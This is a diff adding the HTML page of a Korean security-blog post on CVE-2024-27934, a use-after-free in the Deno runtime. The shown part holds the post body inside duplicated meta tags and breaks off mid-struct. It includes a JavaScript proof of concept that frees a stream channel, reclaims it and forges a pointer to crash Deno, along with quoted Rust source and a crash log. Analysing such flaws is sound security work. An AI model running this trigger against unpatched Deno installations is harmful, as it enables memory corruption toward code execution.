@@ -1,0 +1,852 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf&#34;&gt;https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Deno &amp;#x2265; 1.36.2&lt;/li&gt;
+&lt;li&gt;Deno &amp;lt; 1.40.3&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;JavaScript, TypeScript &amp;#xB7F0;&amp;#xD0C0;&amp;#xC784;&amp;#xC778; Deno&amp;#xC5D0;&amp;#xC11C; RCE&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; Use-After-Free &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Deno&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;*const c_void&lt;/code&gt;&amp;#xC640; &lt;code&gt;external!()&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB85C; &amp;#xC815;&amp;#xC758;&amp;#xB418;&amp;#xB294; &lt;code&gt;ExternalPointer&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC678;&amp;#xBD80; lifetime&amp;#xC744; &amp;#xAC00;&amp;#xC9C4; &amp;#xC784;&amp;#xC758;&amp;#xC758; &lt;code&gt;void *&lt;/code&gt;&amp;#xB97C; wrapping &amp;#xD558;&amp;#xB294; &lt;code&gt;v8::External&lt;/code&gt;&amp;#xC744; &amp;#xD45C;&amp;#xD604;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; Rust&amp;#xC758; lifetime safety&amp;#xB97C; &amp;#xBB34;&amp;#xC2DC;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC548;&amp;#xC804;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD574;&amp;#xB3C4; &amp;#xC774;&amp;#xB97C; &amp;#xD0D0;&amp;#xC9C0;&amp;#xD558;&amp;#xC9C0; &amp;#xBABB;&amp;#xD558;&amp;#xC5EC; &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xC758; PoC&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; Use-After-Free&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC784;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD568;&amp;#xC744; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ops = Deno[Deno.internal].core.ops;
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; rid = ops.op_readable_stream_resource_allocate();
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; sink = ops.op_readable_stream_resource_get_sink(rid);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// close&lt;/span&gt;
+ops.op_readable_stream_resource_close(sink);
+ops.op_readable_stream_resource_close(sink);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// reclaim BoundedBufferChannelInner&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ab = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0x8058&lt;/span&gt;);
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; dv = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;DataView&lt;/span&gt;(ab);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// forge chunk contents&lt;/span&gt;
+dv.setBigUint64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2n&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
+dv.setBigUint64(&lt;span class=&#34;hljs-number&#34;&gt;0x8030&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1337c0d30000n&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// trigger segfault&lt;/span&gt;
+Deno.close(rid);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; 1.38.1 &amp;#xBC84;&amp;#xC804; &amp;#xC804;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;*const c_void&lt;/code&gt;&amp;#xAC00;, &amp;#xADF8; &amp;#xC774;&amp;#xD6C4;&amp;#xBD80;&amp;#xD130;&amp;#xB294; &lt;code&gt;ExternalPointer&lt;/code&gt;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &lt;a href=&#34;https://github.com/denoland/deno/blob/main/ext/web/stream_resource.rs&#34;&gt;stream_resource&lt;/a&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; Use-After-Free&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &lt;code&gt;ops.op_readable_stream_resource_allocate&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; stream resource&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xB41C; resource id&amp;#xB97C; &lt;code&gt;rid&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;BoundedBufferChannelInner&lt;/code&gt;&amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;pub fn op_readable_stream_resource_allocate(state: &amp;amp;mut OpState) -&amp;gt; ResourceId {
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; completion = CompletionHandle::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;();
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; resource = ReadableStreamResource {
+    read_queue: Default::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;(),
+    cancel_handle: Default::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;(),
+    channel: BoundedBufferChannel::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;(),
+    data: ReadableStreamResourceData { completion },
+    size_hint: (&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, None),
+  };
+  state.resource_table.add(resource)
+}
+
+...
+struct BoundedBufferChannel {
+  inner: Rc&amp;lt;RefCell&amp;lt;BoundedBufferChannelInner&amp;gt;&amp;gt;,
+}
+...
+struct BoundedBufferChannelInner {
+  buffers: [MaybeUninit&amp;lt;V8Slice&amp;lt;u8&amp;gt;&amp;gt;; BUFFER_CHANNEL_SIZE &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; _],
+  ring_producer: u16,
+  ring_consumer: u16,
+  error: Option&amp;lt;AnyError&amp;gt;,
+  current_size: usize,
+  &lt;span class=&#34;hljs-comment&#34;&gt;// TODO(mmastrac): we can math this field instead of accounting for it&lt;/span&gt;
+  len: usize,
+  closed: bool,
+
+  read_waker: Option&amp;lt;Waker&amp;gt;,
+  write_waker: Option&amp;lt;Waker&amp;gt;,
+
+  _unsend: PhantomData&amp;lt;std::sync::MutexGuard&amp;lt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;static, ()&amp;gt;&amp;gt;,&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;rid&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;op_readable_stream_resource_get_sink&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; channel&amp;#xC758; &lt;code&gt;ExternalPointer&lt;/code&gt;&amp;#xAC00; &amp;#xC0DD;&amp;#xC131;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;pub fn op_readable_stream_resource_get_sink(
+  state: &amp;amp;mut OpState,
+  #[smi] rid: ResourceId,
+) -&amp;gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; c_void {
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; Ok(resource) = state.resource_table.get::&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;ReadableStreamResource&lt;/span&gt;&amp;gt;&lt;/span&gt;(rid)&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;  else {&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;    return std::ptr::null();&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;  };&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;  ExternalPointer::new(resource.channel.clone()).into_raw()&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;op_readable_stream_resource_close&lt;/code&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xB85C; channel&amp;#xC774; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;Deno.close(rid)&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. PoC&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC640; &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC7AC;&amp;#xD560;&amp;#xB2F9; &amp;#xBC1B;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;close&lt;/code&gt; &amp;#xD638;&amp;#xCD9C; &amp;#xC2DC;&amp;#xC5D0; &amp;#xD568;&amp;#xC218; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB85C; &amp;#xCC38;&amp;#xC870;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB85C; &lt;code&gt;1337c0d30008&lt;/code&gt; &amp;#xB97C; &amp;#xC37C;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;[ &lt;span class=&#34;hljs-number&#34;&gt;6439.821046&lt;/span&gt;] deno[&lt;span class=&#34;hljs-number&#34;&gt;15088&lt;/span&gt;]: segfault at &lt;span class=&#34;hljs-number&#34;&gt;1337&lt;/span&gt;c0d30008 ip &lt;span class=&#34;hljs-number&#34;&gt;0000557&lt;/span&gt;b53e2fb3e sp &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ffd485ac70 error &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; deno[&lt;span class=&#34;hljs-number&#34;&gt;557&lt;/span&gt;b51714000+&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;d7f000] likely on CPU &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt; (core &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;, socket &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
+[ &lt;span class=&#34;hljs-number&#34;&gt;6439.821054&lt;/span&gt;] Code: &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;85&lt;/span&gt; c0 &lt;span class=&#34;hljs-number&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; ff &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;49&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;b &lt;span class=&#34;hljs-number&#34;&gt;86&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;49&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;b be &lt;span class=&#34;hljs-number&#34;&gt;38&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;49&lt;/span&gt; c7 &lt;span class=&#34;hljs-number&#34;&gt;86&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;85&lt;/span&gt; c0 &lt;span class=&#34;hljs-number&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; &amp;lt;ff&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; ff &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt; c4 &lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b &lt;span class=&#34;hljs-number&#34;&gt;41&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e c3 &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;a &lt;span class=&#34;hljs-number&#34;&gt;59&lt;/span&gt; fb &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[하루한줄] CVE-2024-27934: Deno의 Use-After-Free로 인한 RCE 취약점 - hackyboiz">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf&#34;&gt;https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Deno &amp;#x2265; 1.36.2&lt;/li&gt;
+&lt;li&gt;Deno &amp;lt; 1.40.3&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;JavaScript, TypeScript &amp;#xB7F0;&amp;#xD0C0;&amp;#xC784;&amp;#xC778; Deno&amp;#xC5D0;&amp;#xC11C; RCE&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; Use-After-Free &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Deno&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;*const c_void&lt;/code&gt;&amp;#xC640; &lt;code&gt;external!()&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB85C; &amp;#xC815;&amp;#xC758;&amp;#xB418;&amp;#xB294; &lt;code&gt;ExternalPointer&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC678;&amp;#xBD80; lifetime&amp;#xC744; &amp;#xAC00;&amp;#xC9C4; &amp;#xC784;&amp;#xC758;&amp;#xC758; &lt;code&gt;void *&lt;/code&gt;&amp;#xB97C; wrapping &amp;#xD558;&amp;#xB294; &lt;code&gt;v8::External&lt;/code&gt;&amp;#xC744; &amp;#xD45C;&amp;#xD604;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; Rust&amp;#xC758; lifetime safety&amp;#xB97C; &amp;#xBB34;&amp;#xC2DC;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC548;&amp;#xC804;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD574;&amp;#xB3C4; &amp;#xC774;&amp;#xB97C; &amp;#xD0D0;&amp;#xC9C0;&amp;#xD558;&amp;#xC9C0; &amp;#xBABB;&amp;#xD558;&amp;#xC5EC; &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xC758; PoC&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; Use-After-Free&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC784;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD568;&amp;#xC744; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ops = Deno[Deno.internal].core.ops;
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; rid = ops.op_readable_stream_resource_allocate();
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; sink = ops.op_readable_stream_resource_get_sink(rid);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// close&lt;/span&gt;
+ops.op_readable_stream_resource_close(sink);
+ops.op_readable_stream_resource_close(sink);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// reclaim BoundedBufferChannelInner&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ab = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0x8058&lt;/span&gt;);
+&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; dv = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;DataView&lt;/span&gt;(ab);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// forge chunk contents&lt;/span&gt;
+dv.setBigUint64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2n&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
+dv.setBigUint64(&lt;span class=&#34;hljs-number&#34;&gt;0x8030&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1337c0d30000n&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// trigger segfault&lt;/span&gt;
+Deno.close(rid);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; 1.38.1 &amp;#xBC84;&amp;#xC804; &amp;#xC804;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;*const c_void&lt;/code&gt;&amp;#xAC00;, &amp;#xADF8; &amp;#xC774;&amp;#xD6C4;&amp;#xBD80;&amp;#xD130;&amp;#xB294; &lt;code&gt;ExternalPointer&lt;/code&gt;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &lt;a href=&#34;https://github.com/denoland/deno/blob/main/ext/web/stream_resource.rs&#34;&gt;stream_resource&lt;/a&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; Use-After-Free&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &lt;code&gt;ops.op_readable_stream_resource_allocate&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; stream resource&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xB41C; resource id&amp;#xB97C; &lt;code&gt;rid&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;BoundedBufferChannelInner&lt;/code&gt;&amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;pub fn op_readable_stream_resource_allocate(state: &amp;amp;mut OpState) -&amp;gt; ResourceId {
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; completion = CompletionHandle::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;();
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; resource = ReadableStreamResource {
+    read_queue: Default::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;(),
+    cancel_handle: Default::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;(),
+    channel: BoundedBufferChannel::&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;(),
+    data: ReadableStreamResourceData { completion },
+    size_hint: (&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, None),
+  };
+  state.resource_table.add(resource)
+}
+
+...
+struct BoundedBufferChannel {
+  inner: Rc&amp;lt;RefCell&amp;lt;BoundedBufferChannelInner&amp;gt;&amp;gt;,
+}
+...
+struct BoundedBufferChannelInner {
+  buffers: [MaybeUninit&amp;lt;V8Slice&amp;lt;u8&amp;gt;&amp;gt;; BUFFER_CHANNEL_SIZE &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; _],
+  ring_producer: u16,
+  ring_consumer: u16,
+  error: Option&amp;lt;AnyError&amp;gt;,
+  current_size: usize,
+  &lt;span class=&#34;hljs-comment&#34;&gt;// TODO(mmastrac): we can math this field instead of accounting for it&lt;/span&gt;
+  len: usize,
+  closed: bool,
+
+  read_waker: Option&amp;lt;Waker&amp;gt;,
